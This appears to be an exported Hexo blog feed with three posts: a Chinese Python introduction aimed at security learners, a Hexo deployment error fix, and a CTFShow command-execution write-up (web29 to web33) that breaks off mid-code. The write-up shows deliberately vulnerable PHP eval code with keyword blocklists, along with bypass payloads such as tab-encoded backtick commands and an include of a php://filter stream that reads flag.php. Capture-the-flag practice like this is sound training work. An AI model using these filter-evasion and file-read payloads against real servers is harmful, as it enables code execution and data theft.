src="https://picgo-1301783483.cos.ap-nanjing.myqcloud.com/image/image-20220411154422191.png" alt="image-20220411154422191"></p><p>谈及python，涉及两层意思，一层代表的是<strong>python这门语言的语法风格</strong>，另外一层代表的则是专门用来解释该语法风格的应用程序：<strong>python解释器。</strong> </p><p>python的创始人为<code>吉多·范罗苏姆（Guido van Rossum</code>）。( 龟叔) Python这个名字，来自Guido所挚爱的电视剧</p><p>Monty  Python’s Flying Circus，他希望这个新的叫做Python的语言，能符合他的理想：创造一种C和shell之</p><p>间，语法够像shell一样简洁，易学易用、可拓展性强，同时兼顾C的强大功能。于是Guido在1989年的<strong>圣诞节</strong>期</p><p>间，开始写能够解释Python语言语法的解释器，最终用了一两周用c语言编写出了python解释器，即cpython。</p><p>也就是你在官网下载的就是这个解释器。</p><h3 id="2-1-python发展史"><a href="#2-1-python发展史" class="headerlink" title="2.1 python发展史"></a>2.1 python发展史</h3><p>1989年，Guido (龟叔) 开始写Python语言的编译器。 1991年，第一个Python编译器诞生。它是用C语言实现的，并能够调用C语言的库文件。从一出生，Python已经具有了：类，函数，异常处理，包含表和词典在内的核心数据类型，以及模块为基础的拓展系统。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Granddaddy of Python web frameworks, Zope 1 was released in 1999</span><br><span class="line"></span><br><span class="line">Python 1.0 - January 1994 增加了 lambda, map, filter and reduce.</span><br><span class="line"></span><br><span class="line">Python 2.0 - October 16, 2000，加入了内存回收机制，构成了现在Python语言框架的基础</span><br><span class="line"></span><br><span class="line">Python 2.4 - November 30, 2004, 同年目前最流行的WEB框架Django 诞生</span><br><span class="line"></span><br><span class="line">Python 2.5 - September 19, 2006</span><br><span class="line"></span><br><span class="line">Python 2.6 - October 1, 2008</span><br><span class="line"></span><br><span class="line">Python 2.7 - July 3, 2010</span><br><span class="line"></span><br><span class="line">In November 2014, it was announced that Python 2.7 would be supported until 2020, and reaffirmed that there would be no 2.8 release as users were expected to move to Python 3.4+ as soon as possible</span><br></pre></td></tr></table></figure><p>Python 3.0 - December 3, 2008 (细心的读者会发现，08年时就推出了3.0，2010年反而又推出了2.7？是因为3.0不向下兼容2.0，而很多公司已经基于2.0版本开发出了大量程序，公司已然投入了大量的人财物力，这就导致大家都拒绝升级3.0，无奈官方只能推出2.7过渡版本，之后我们都应该采用3.0解释器开发程序，但为了方便读者维护2.0版本的软件，我们在遇到两种版本的差异时会专门指出来)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Python 3.1 - June 27, 2009</span><br><span class="line"></span><br><span class="line">Python 3.2 - February 20, 2011</span><br><span class="line"></span><br><span class="line">Python 3.3 - September 29, 2012</span><br><span class="line"></span><br><span class="line">Python 3.4 - March 16, 2014</span><br><span class="line"></span><br><span class="line">Python 3.5 - September 13, 2015</span><br><span class="line"></span><br><span class="line">Python 3.6 - 2016-12-23 发布python3.6.0版</span><br><span class="line"></span><br><span class="line">python 3.8 </span><br><span class="line"></span><br><span class="line">python 3.9</span><br><span class="line"></span><br><span class="line">python 3.10</span><br><span class="line"></span><br><span class="line">其中3.7是一个小的分水岭 , 更新了很多异步的一些语法</span><br></pre></td></tr></table></figure><h3 id="2-2-python解释器的种类"><a href="#2-2-python解释器的种类" class="headerlink" title="2.2 python解释器的种类"></a>2.2 python解释器的种类</h3><p>官方的Python解释器本质就是基于C语言开发的一个软件，该软件的功能就是读取以.py结尾的文件内容，然后按</p><p>照Guido定义好的语法和规则去翻译并执行相应的代码。这种用C实现的解释器称为CPython，它是python领域</p><p>性能最好，应用最广泛的一款解释器，我们在后面提到的解释器指的都是Cpython解释器。但其实解释器作为一</p><p>款应用软件，完全可以采用其他语言来开发，只要能解释python这门语言的语法即可。Python解释器的一些种类</p><p>如下，简单了解即可。</p><h4 id="2-2-1-CPython"><a href="#2-2-1-CPython" class="headerlink" title="2.2.1 CPython"></a>2.2.1 CPython</h4><p>当从Python官方网站下载并安装好Python3.8后，就直接获得了一个官方版本的解释器：Cpython，这个解释器</p><p>是用C语言开发的，所以叫CPython，在命名行下运行python，就是启动CPython解释器，CPython是使用最广</p><p>的Python解释器。</p><h4 id="2-2-2-IPython"><a href="#2-2-2-IPython" class="headerlink" title="2.2.2 IPython"></a>2.2.2 IPython</h4><p>IPython是基于CPython之上的一个交互式解释器，也就是说，IPython只是在交互方式上有所增强，但是执行</p><p>Python代码的功能和CPython是完全一样的，好比很多国产浏览器虽然外观不同，但内核其实是调用了IE。</p><h4 id="2-2-3-PyPy"><a href="#2-2-3-PyPy" class="headerlink" title="2.2.3 PyPy"></a>2.2.3 PyPy</h4><p>PyPy是另一个Python解释器，它的目标是执行速度，PyPy采用JIT技术，对Python代码进行动态编译，所以可以</p><p>显著提高Python代码的执行速度。</p><h4 id="2-2-4-Jython"><a href="#2-2-4-Jython" class="headerlink" title="2.2.4 Jython"></a>2.2.4 Jython</h4><p>Jython是运行在Java平台上的Python解释器，可以直接把Python代码编译成Java字节码执行。</p><h4 id="2-2-5-IronPython"><a href="#2-2-5-IronPython" class="headerlink" title="2.2.5 IronPython"></a>2.2.5 IronPython</h4><p>IronPython和Jython类似，只不过IronPython是运行在微软.Net平台上的Python解释器，可以直接把Python代</p><p>码编译成.Net的字节码。</p><p><strong>在Python的解释器中，使用广泛的是CPython，对于Python的编译，除了可以采用以上解释器进行编译外，技术高超的开发者还可以按照自己的需求自行编写Python解释器来执行Python代码，十分的方便!</strong></p><h3 id="2-3-python解释器的安装"><a href="#2-3-python解释器的安装" class="headerlink" title="2.3 python解释器的安装"></a>2.3 python解释器的安装</h3><blockquote><p>见笔记  1.python安装和pip换源.md</p></blockquote><h3 id="2-4-运行python程序的两种方式"><a href="#2-4-运行python程序的两种方式" class="headerlink" title="2.4 运行python程序的两种方式"></a>2.4 运行python程序的两种方式</h3><h4 id="2-4-1-交互式"><a href="#2-4-1-交互式" class="headerlink" title="2.4.1 交互式"></a>2.4.1 交互式</h4><p>即时得到程序的运行结果，但是代码没有永久保存，多用于调试，比如 可以拿来当计算器用。</p><p>打开命令行，输入python，然后就可以编写代码了（注意编写用的符号全是英文的）</p><p><img src="https://picgo-1301783483.cos.ap-nanjing.myqcloud.com/image/image-20220411155458265.png" alt="image-20220411155458265"></p><p>退出是 <code>exit()</code></p><h4 id="2-4-2-脚本的方式"><a href="#2-4-2-脚本的方式" class="headerlink" title="2.4.2 脚本的方式"></a>2.4.2 脚本的方式</h4><p>把程序写到一个文件中（约定俗称文件后缀名为.py）, 然后用python解释器，解释执行里面的内容。</p><p><code>python解释器 + 空格 + 文件路径</code>（注意命令路径中不能有空格）</p><p>示例</p><p>在桌面新建一个<code>demo.py</code>文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;hello word&quot;</span>)</span><br></pre></td></tr></table></figure><p>然后使用python解释器运行该py文件</p><p><img src="https://picgo-1301783483.cos.ap-nanjing.myqcloud.com/image/image-20220411155727896.png" alt="image-20220411155727896"></p><p>虽然这样可以将代码永久保存了，但是每次执行都要用命令行，而且用的文本编辑器，写代码无任何提示。（后面会介绍到集成开发环境）, 即使用 <code>pycharm</code> 编写py脚本</p><h3 id="2-5-一个python程序运行的三个步骤"><a href="#2-5-一个python程序运行的三个步骤" class="headerlink" title="2.5 一个python程序运行的三个步骤"></a>2.5 一个python程序运行的三个步骤</h3><ul><li><p>python <code> D:\桌面\demo.py</code>    执行python程序经历的三个步骤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">- 1.先启动python解释器，相当于启动了一个文本编辑器</span><br><span class="line">- 2.解释器会发送系统调用，把demo.py的内容，从硬盘中读取出来，</span><br><span class="line">    并加载到内存，此时demo.py中的内容全部为普通字符，没有任何意义</span><br><span class="line">- 3.按下回车，解释器开始解释执行刚刚读到内存的demo.py的代码，开始识别python语法 , 执行代码</span><br></pre></td></tr></table></figure></li><li><p>对比文本编辑器读取 C:\a\b\c.py文件 内容也经历了三个步骤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、先启动文本编辑器</span><br><span class="line">2、文本编辑器会发送系统调用，把c.py的内容从硬盘读入内存</span><br><span class="line">3、文本编辑会将刚刚读入内存的内容控制输出到屏幕上，让用户看到结果</span><br></pre></td></tr></table></figure></li><li><p>总结：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">二者在前两个阶段做的事情完全一致</span><br><span class="line">唯一不同的就是第三个阶段对读入内存的python代码的处理方式不同,</span><br><span class="line">一个检测语法是否正确，一个不检测。</span><br></pre></td></tr></table></figure></li></ul><h2 id="3-集成开发环境"><a href="#3-集成开发环境" class="headerlink" title="3. 集成开发环境"></a>3. 集成开发环境</h2><blockquote><p>见 2.pycharm破解激活</p></blockquote><h2 id="4-python可以做什么"><a href="#4-python可以做什么" class="headerlink" title="4. python可以做什么"></a>4. python可以做什么</h2><table><thead><tr><th><strong>应用方向</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td>网路爬虫</td><td>Google 等搜索引擎公司大量地使用 Python 语言编写网络爬虫。</td></tr><tr><td>数据分析</td><td>用爬虫爬到了大量的数据之后最终的目的就是分析数据。</td></tr><tr><td>机器学习</td><td>机器学习就是人工智能的一个分支，应用有自然语言处理，搜索引擎，各种识别技术，数据挖掘等等。</td></tr><tr><td>WEB应用&#x2F;小程序开发</td><td>国内：豆瓣&#x2F;知乎(以前是python,现在是go) 国外：YouTube 使用的是Python作为WEB开发基础语言。</td></tr><tr><td>APP应用开发</td><td>Python 可以开发OS X，Linux，Windows，iOS，Android 等平台的应用。</td></tr><tr><td>游戏开发</td><td>Python开发的游戏几乎可以运行在所有常用的操作系统里面。</td></tr><tr><td>自动化脚本</td><td>频繁、重复、无脑的操作都可以使用Python脚本代替操作，以此节省大量时间</td></tr></tbody></table><h2 id="5-python语言的特点"><a href="#5-python语言的特点" class="headerlink" title="5. python语言的特点"></a>5. python语言的特点</h2><blockquote><p>python中一切皆对象</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">语法简洁 : 弱类型语言不多哔哔</span><br><span class="line">可跨平台 : 只要能够安装解释器哪里都能运行</span><br><span class="line">应用广泛 : 上到机器学习下到嵌入式</span><br><span class="line">可读性强 : 通过强制缩进体现语句间的逻辑关系提高了程序的可读性</span><br><span class="line">模式多样 : 语法层面同时支持面向过程和面向对象两种编程方式</span><br><span class="line">粘性扩展 : 通过接口和函数集成其他语言编写的代码</span><br><span class="line">开源理念 : 解释器众多，代码也能加密...</span><br><span class="line">库类丰富 : 再造一个轮子也不嫌多</span><br></pre></td></tr></table></figure><h2 id="6-我们安全学习python是为了什么"><a href="#6-我们安全学习python是为了什么" class="headerlink" title="6. 我们安全学习python是为了什么?"></a>6. 我们安全学习python是为了什么?</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. python语法简洁 , 容易上手 , 编写一些渗透测试工具更加方便</span><br><span class="line">2. 相对于其他 c , java等更易于编写poc</span><br><span class="line">3. 完成一些批量的检测 , 如批量检测漏洞是否存在</span><br><span class="line">4. 批量利用</span><br></pre></td></tr></table></figure><p>渗透或者说搞安全</p><h3 id="必须要掌握一门编程语言-因为代码才是根本"><a href="#必须要掌握一门编程语言-因为代码才是根本" class="headerlink" title="必须要掌握一门编程语言 , 因为代码才是根本"></a><code>必须要掌握一门编程语言</code> , 因为代码才是根本</h3><p>掌握程度 , 相对于我们当前的领域要达到能够直接拿过来就能写 ( 或者2开 ) 的要求  , 而且这也是面试中对岗位的一个硬性需求</p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo部署出现错误 Error Spawn failed 解决方式</title>
      <link href="/2022/09/17/Hexo%E9%83%A8%E7%BD%B2%E5%87%BA%E7%8E%B0%E9%94%99%E8%AF%AF%20Error%20Spawn%20failed%20%E8%A7%A3%E5%86%B3%E6%96%B9%E5%BC%8F/"/>
      <url>/2022/09/17/Hexo%E9%83%A8%E7%BD%B2%E5%87%BA%E7%8E%B0%E9%94%99%E8%AF%AF%20Error%20Spawn%20failed%20%E8%A7%A3%E5%86%B3%E6%96%B9%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="Hexo部署出现错误-Error-Spawn-failed-解决方式"><a href="#Hexo部署出现错误-Error-Spawn-failed-解决方式" class="headerlink" title="Hexo部署出现错误 Error: Spawn failed 解决方式"></a>Hexo部署出现错误 Error: Spawn failed 解决方式</h1><p><a href="https://www.myosotis.xin/categories/Hexo/">Hexo</a></p><blockquote><p>Hexo部署出现一下错误err: Error: Spawn failed解决方式</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">FATAL &#123;</span><br><span class="line">  err: Error: Spawn failed</span><br><span class="line">      at ChildProcess.&lt;anonymous&gt; (C:\Users\myosotis\Desktop\Hexo_blog\node_modules\hexo-util\lib\spawn.js:51:21)</span><br><span class="line">      at ChildProcess.emit (events.js:315:20)</span><br><span class="line">      at ChildProcess.cp.emit (C:\Users\myosotis\Desktop\Hexo_blog\node_modules\cross-spawn\lib\enoent.js:34:29)</span><br><span class="line">      at Process.ChildProcess._handle.onexit (internal/child_process.js:277:12) &#123;</span><br><span class="line">    code: 128</span><br><span class="line">  &#125;</span><br><span class="line">&#125; Something&#x27;s wrong. Maybe you can find the solution here: %s https://hexo.io/docs/troubleshooting.html</span><br></pre></td></tr></table></figure><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##进入站点根目录</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##删除git提交内容文件夹</span></span><br><span class="line"><span class="built_in">rm</span> -rf .deploy_git/</span><br><span class="line"></span><br><span class="line"><span class="comment">##执行</span></span><br><span class="line">git config --global core.autocrlf <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##最后</span></span><br><span class="line">hexo clean &amp;&amp; hexo g &amp;&amp; hexo d</span><br></pre></td></tr></table></figure><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><blockquote><p>修改 _config.yml 文件，将配置地址http方式切换成ssh方式</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##进入站点根目录</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##删除git提交内容文件夹</span></span><br><span class="line">vim _config.yml</span><br><span class="line"></span><br><span class="line"><span class="comment">##修改</span></span><br><span class="line">deploy:</span><br><span class="line"></span><br><span class="line"><span class="built_in">type</span>: git</span><br><span class="line"></span><br><span class="line">repository: https://github.com/Uninfo/blog.github.io.git </span><br><span class="line">-&gt; git@github.com:Uninfo/blog.github.io.git</span><br><span class="line"></span><br><span class="line">branch: master</span><br><span class="line"></span><br><span class="line"><span class="comment">##最后</span></span><br><span class="line">hexo clean &amp;&amp; hexo g &amp;&amp; hexo d</span><br></pre></td></tr></table></figure><h3 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h3><blockquote><p>强制上传，不建议</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##进入站点根目录</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##进入depoly文件夹</span></span><br><span class="line"><span class="built_in">cd</span> .deploy_git/</span><br><span class="line"></span><br><span class="line"><span class="comment">##强制推送</span></span><br><span class="line">git push -f</span><br></pre></td></tr></table></figure><ul><li><strong>本文作者：</strong>毋忘草</li><li><strong>本文链接：</strong><a href="https://blog.myosotis.xin/2021/08/25/hexo-8/">https://blog.myosotis.xin/2021/08/25/hexo-8/</a></li><li><strong>版权声明：</strong>本博客所有文章除特别声明外，均默认采用 许可协议。</li></ul>]]></content>
      
      
      <categories>
          
          <category> Error Spawn failed </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo Error Spawn failed </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFShow命令执行</title>
      <link href="/2022/09/16/CTFShow/CTFShow_%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
      <url>/2022/09/16/CTFShow/CTFShow_%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>CTFShow命令执行</p><h1 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: h1xa</span><br><span class="line"># @Date:   2020-09-04 00:12:34</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-04 00:26:48</span><br><span class="line"># @email: h1xa@ctfer.com</span><br><span class="line"># @link: https://ctfer.com</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c = $_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/flag/i&quot;, $c))&#123;</span><br><span class="line">        eval($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先查看下flag的目录</p><p><img src="https://raw.githubusercontent.com/Sured4rag0n/Cartographic-bed/main/PicGo202209221012958.png"></p><p>flag被禁掉了，用通配符* </p><p><img src="https://raw.githubusercontent.com/Sured4rag0n/Cartographic-bed/main/PicGo202209221024473.png"></p><h1 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: h1xa</span><br><span class="line"># @Date:   2020-09-04 00:12:34</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-04 00:42:26</span><br><span class="line"># @email: h1xa@ctfer.com</span><br><span class="line"># @link: https://ctfer.com</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c = $_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/flag|system|php/i&quot;, $c))&#123;</span><br><span class="line">        eval($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本关system被禁用了，用echo代替</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=echo `tac *`;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Sured4rag0n/Cartographic-bed/main/PicGo202209221048336.png"></p><p>查看flag，用通配符代替*被禁用的flag</p><p><img src="https://raw.githubusercontent.com/Sured4rag0n/Cartographic-bed/main/PicGo202209221057901.png"></p><h1 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: h1xa</span><br><span class="line"># @Date:   2020-09-04 00:12:34</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-04 00:49:10</span><br><span class="line"># @email: h1xa@ctfer.com</span><br><span class="line"># @link: https://ctfer.com</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c = $_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;, $c))&#123;</span><br><span class="line">        eval($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=echo%09`tac%09*`;</span><br></pre></td></tr></table></figure><p>空格被过滤了，%20编码没绕过去，用%09拼接 ps:语句中：%09 ， &lt;(用于拼接命令，比如nl&lt;fl??.php) ， ‘’ ，$IFS</p><p><img src="https://raw.githubusercontent.com/Sured4rag0n/Cartographic-bed/main/PicGo202209221107005.png"></p></blockquote><p>tac fla*还有个空格，继续用%09绕过</p><p><img src="https://raw.githubusercontent.com/Sured4rag0n/Cartographic-bed/main/PicGo202209221109595.png"></p><h1 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: h1xa</span><br><span class="line"># @Date:   2020-09-04 00:12:34</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-04 00:56:31</span><br><span class="line"># @email: h1xa@ctfer.com</span><br><span class="line"># @link: https://ctfer.com</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c = $_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;, $c))&#123;</span><br><span class="line">        eval($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>过滤了echo和system，空格，&#96;反引号统统过滤了。不过还有新姿势，利用include函数(还有require也可以)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=include$_POST[a]?&gt;</span><br><span class="line">POST:a=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Sured4rag0n/Cartographic-bed/main/PicGo202209221111300.png"></p><p>然后再base64解码拿到flag</p><h1 id="web33"><a href="#web33" class="headerlink" title="web33"></a>web33</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: h1xa</span><br><span class="line"># @Date:   2020-09-04 00:12:34</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-04 02:22:27</span><br><span class="line"># @email: h1xa@ctfer.com</span><br><span class="line"># @link: https://ctfer.com</span><br><span class="line">*/</span><br><span class="line">//</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c = $_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\&quot;/i&quot;, $c))&#123;</span><br><span class="line">        eval($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>过滤了双引号，继续使用上一题payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 